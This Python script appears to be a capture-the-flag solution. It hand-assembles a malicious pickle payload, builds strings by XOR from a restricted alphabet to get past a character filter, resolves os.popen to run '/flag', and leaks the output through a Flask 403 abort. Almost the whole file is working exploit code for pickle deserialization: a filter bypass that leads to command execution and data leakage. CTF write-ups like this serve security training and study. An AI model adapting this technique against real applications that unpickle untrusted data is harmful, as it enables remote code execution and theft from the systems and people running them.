import base64
from collections import defaultdict
from struct import pack

LETTERS = 'HAXORhaxor0123456789'


# Generating XOR recipes
def generate_recipes():
    recipes_2 = defaultdict(list)
    for a in LETTERS:
        for c in LETTERS:
            recipes_2[chr(ord(a) ^ ord(c))].append((a, c))

    recipes_3 = defaultdict(list)
    for a in LETTERS:
        for c in recipes_2.keys():
            for x, y in recipes_2[c]:
                recipes_3[chr(ord(a) ^ ord(c))].append((x, y, a))

    return recipes_2, recipes_3


RECIPES2, RECIPES3 = generate_recipes()


# Defining pickle helpers
def encode_str2(target):
    a = ''
    b = ''
    for t in target:
        # Simply taking the first recipe is not bulletproof, but in practice it works for the strings we can
        # make with this function.
        na, nb = RECIPES2[t][0]
        a += na
        b += nb
    return a, b


def encode_str3(target, numeric_column=False):
    a = ''
    b = ''
    c = ''
    for i, t in enumerate(target):
        for na, nb, nc in RECIPES3[t]:
            if (not numeric_column and na.isalpha() and nb.isnumeric() and nc.isnumeric()) \
                    or (numeric_column and na.isalpha() and nb.isnumeric() and nc.isalpha()):
                if i == 0 and (nb == '0' or nc == '0'):
                    continue
                a += na
                b += nb
                c += nc
                break
    return a, b, c


def pack_integer(i):
    return b'\x4a' + pack('i', int(i))


def pack_short(i):
    return b'\x4d' + pack('h', i)


def pack_string(s):
    return b'\x8c' + pack('B', len(s)) + s.encode('ascii')


def put(i):
    return b'\x71' + pack('B', i)


def get(i):
    return b'\x68' + pack('B', i)


START = b'\x80\x05'
STOP = b'.'
STACK_GLOBAL = b'\x93'
MARK = b'('
TUPLE = b't'
EMPTY_TUPLE = b'\x29'
REDUCE = b'R'
DEC_XOR = pack_string('haxxor') + put(8) + pack_string('xor') + put(9)
XOR = get(8) + get(9) + STACK_GLOBAL


def encase_string(target_str, triple=False, numeric_column=False):
    if triple:
        a, b, c = encode_str3(target_str, numeric_column)
        if numeric_column:
            return XOR + MARK + XOR + MARK + pack_string(a) + pack_integer(b) + TUPLE + REDUCE + pack_string(c) + TUPLE + REDUCE
        else:
            return XOR + MARK + XOR + MARK + pack_string(a) + pack_integer(b) + TUPLE + REDUCE + pack_integer(c) + TUPLE + REDUCE
    else:
        a, b = encode_str2(target_str)
        return XOR + MARK + pack_string(a) + pack_integer(b) + TUPLE + REDUCE


DEC_GETATTR = encase_string('builtins', triple=True) + put(6) + encase_string('getattr') + put(7)
GETATTR = get(6) + get(7) + STACK_GLOBAL

# Building the final query
get_flag_path = GETATTR + MARK + encase_string('/', triple=True, numeric_column=True) + encase_string('__add__', triple=True) + TUPLE + REDUCE + MARK + encase_string('flag') + TUPLE + REDUCE
execute_flag = encase_string('os') + encase_string('popen') + STACK_GLOBAL + MARK + get_flag_path + TUPLE + REDUCE
read_flag = GETATTR + MARK + execute_flag + encase_string('read') + TUPLE + REDUCE + EMPTY_TUPLE + REDUCE + put(1)
solution = START + DEC_XOR + DEC_GETATTR + read_flag + encase_string('flask') + encase_string('abort') + STACK_GLOBAL + MARK + pack_short(403) + get(1) + TUPLE + REDUCE + STOP
print(base64.b64encode(solution).decode('ascii'))
